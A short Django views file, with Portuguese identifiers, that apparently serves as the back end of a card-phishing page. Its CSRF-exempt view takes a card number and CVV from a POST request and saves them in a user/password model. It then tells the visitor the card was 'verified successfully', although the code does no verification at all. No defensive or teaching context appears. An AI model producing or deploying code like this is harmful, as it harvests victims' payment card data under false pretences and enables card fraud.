from django.shortcuts import render
from .models import Usuario
from django.views.decorators.csrf import csrf_exempt
from django.http import JsonResponse
from django.views.decorators.http import require_POST
from django.utils.decorators import method_decorator
import json

def index(request):
    return render(request, 'index.html')

@require_POST
@csrf_exempt
def salvar_dados_view(request):
    dados = json.loads(request.body)
    numero = dados.get('ncartao')
    cvc = dados.get('ncvv')

    Usuario.objects.create(user=numero, passw=cvc)

    return JsonResponse({'mensagem': 'Cartão verificado com sucesso!'})